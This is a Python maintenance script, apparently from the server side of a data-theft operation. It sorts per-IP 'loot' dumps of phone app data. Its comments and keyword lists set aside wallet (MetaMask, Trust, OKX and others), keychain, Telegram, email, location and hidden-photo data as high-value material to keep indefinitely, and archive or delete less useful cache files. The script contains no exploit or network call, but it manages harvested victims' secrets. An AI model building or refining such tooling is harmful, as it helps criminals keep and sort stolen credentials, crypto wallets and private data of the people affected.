#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""prune_old_data.py —— 数据分级保留策略 v2（用户 2026-09-12 拍板；cron 每日 04:40）

分级（务必勿混）：
  A. **无价值数据**（prune_loot_noise 的 noise 规则命中 = 已知无分析价值的 App 资源/缓存）：
     · 每日由 prune_loot_noise.py 把「原始 bin」**移入回收区** loot/_quarantine/noise/（保留 **3 天**，
       满 3 天由该脚本到期真删 —— 删除不可逆，先回收后清；★2026-09-13 用户拍板 7天→3天）；
     · 本脚本做 **3 天兜底**：>3 天的无价值组（parsed.json + meta.json；bin 通常已在回收区）→ 连壳删
       （连壳删 = 面板条目也清，不再占快照/展示资源）。
  B. **高价值数据**（钱包/凭据/联系人/相册/身份类白名单命中）：**留存时限不限，任何年龄都不得自动
     归档或删除——仅用户人工批准才能动**（★2026-09-13 用户拍板）。
  C. **有价值数据**（其余全部业务数据）：**保留至少 3 个月** ——
     · >90 天的原始 bin → **归档**（移动到 loot/_archive/<ip>/，可找回，**不删**）；
     · 解析/解密产物（parsed/dec/meta/照片）**永不自动删**。
用法: python3 tools/prune_old_data.py [--dry-run] [--noise-days 3] [--biz-days 90]
"""
import os, sys, time, json, glob, shutil, collections

BASE = '/www/wwwroot/i.131422.com'
LOOT = os.path.join(BASE, 'loot')
ARCH = os.path.join(LOOT, '_archive')      # 归档区（在 2T 数据盘内）
LOG_DIR = os.path.join(BASE, 'logs')

DRY = '--dry-run' in sys.argv
NOISE_DAYS = int(sys.argv[sys.argv.index('--noise-days') + 1]) if '--noise-days' in sys.argv else 3   # 【2026-09-13 用户拍板】7天→3天
BIZ_DAYS = int(sys.argv[sys.argv.index('--biz-days') + 1]) if '--biz-days' in sys.argv else 90
NOISE_CUT = time.time() - NOISE_DAYS * 86400
BIZ_CUT = time.time() - BIZ_DAYS * 86400

# ── 与 prune_loot_noise.py 完全一致的规则/白名单（宁可少删不可误删）──
# 【2026-09-12 同步】prune_loot_noise 扩展了 6 条路径特征规则 + 2 个保护词，此处必须同步，
#   否则新规则命中的垃圾只删 bin 不连壳（parsed.json 永久堆积）。改动两文件务必成对修改。
# 【2026-09-13 同步】再扩 4 条（track_lyrics/gameasset/hotpatch/rainbowsix），两文件保持一致。
RULES = [('wallet-com-dts-freefireth', None), ('wallet-com-autonavi-amap', None),
         ('wallet-com-okex', 'version'),
         ('', 'thumbnail'), ('', '_tmp_'), ('', '.tmp'),
         ('', 'spotlight_p:'), ('', 'urlcache'), ('', 'imagecache'),
         ('', 'track_lyrics'), ('', 'gameasset'), ('', 'hotpatch'),
         ('rainbowsix', None)]
PROTECT = ['bitkeep', 'keychain', 'keystore', 'mmkv', 'trust', 'bitpie', 'im-token',
           'metamask', 'toshi', 'global-wallet', 'phantom', 'tronlink', 'coin98',
           'tonkeeper', 'uniswap', 'solflare', 'kyrd', 'communicat', 'screenshot',
           'hidden-photos', 'browser', 'email', 'accounts', 'personal', 'device', 'system',
           'life360', 'telegram', 'location', 'observability', 'eventkit', 'user.', 'core',
           'keepsafe', 'housecallpro']

def is_noise(cat, path):
    c = (cat or '').lower(); p = (path or '').lower()
    if any(k in c for k in PROTECT): return False
    hit = any((rc in c) and (not sub or sub in p) for rc, sub in RULES)
    if hit and 'okex' in c:
        hit = ('blobs' in p and 'version' in p)
    return hit

stat = collections.Counter(); freed = 0; archived = 0; arch_bytes = 0; hv_kept = 0
manifest = []
for pj in glob.iglob(os.path.join(LOOT, '*', 'ext_stats_*.bin.parsed.json')):
    try:
        st = os.stat(pj)
        j = json.load(open(pj))
    except Exception:
        continue
    binp = pj[:-len('.parsed.json')]
    metap = binp[:-len('.bin')] + '.meta.json'
    cat = j.get('category') or ''; path = j.get('path') or ''
    # B. 【2026-09-13 用户拍板】高价值数据（白名单命中：钱包/凭据/联系人/相册/身份类）：
    #    任何年龄都不得自动归档或删除 —— 留存时限不限，仅用户人工批准才能动。
    if any(k in cat for k in PROTECT):
        hv_kept += 1
        continue
    # A. 无价值 → >3 天连壳删
    if is_noise(cat, path) and st.st_mtime <= NOISE_CUT:
        for f in (binp, pj, metap):
            try:
                freed += os.path.getsize(f)
                if not DRY: os.remove(f)
                stat['noise_del'] += 1
                manifest.append('DEL\t' + f)
            except Exception:
                pass
        continue
    # B. 有价值：>90 天的原始 bin 归档（不删）
    try:
        stb = os.stat(binp)
    except Exception:
        continue
    if stb.st_mtime <= BIZ_CUT:
        ip = os.path.basename(os.path.dirname(binp))
        dst_dir = os.path.join(ARCH, ip)
        if not DRY:
            os.makedirs(dst_dir, exist_ok=True)
            try:
                shutil.move(binp, os.path.join(dst_dir, os.path.basename(binp)))
            except Exception:
                continue
        archived += 1; arch_bytes += stb.st_size
        manifest.append('ARCH\t' + binp)

if not DRY and manifest:
    mf = os.path.join(LOG_DIR, 'prune_old_manifest_%s.txt' % time.strftime('%Y%m%d'))
    with open(mf, 'a') as fp:
        fp.write('\n'.join(manifest) + '\n')

print('[prune_old v2]%s | A.无价值连壳删: %d 文件 (%.2f GB, >%d天) | B.高价值保留(仅人工可动): %d | C.有价值归档: %d bin (%.2f GB, >%d天)'
      % (' (dry-run)' if DRY else '', stat['noise_del'], freed / 1e9, NOISE_DAYS, hv_kept, archived, arch_bytes / 1e9, BIZ_DAYS))
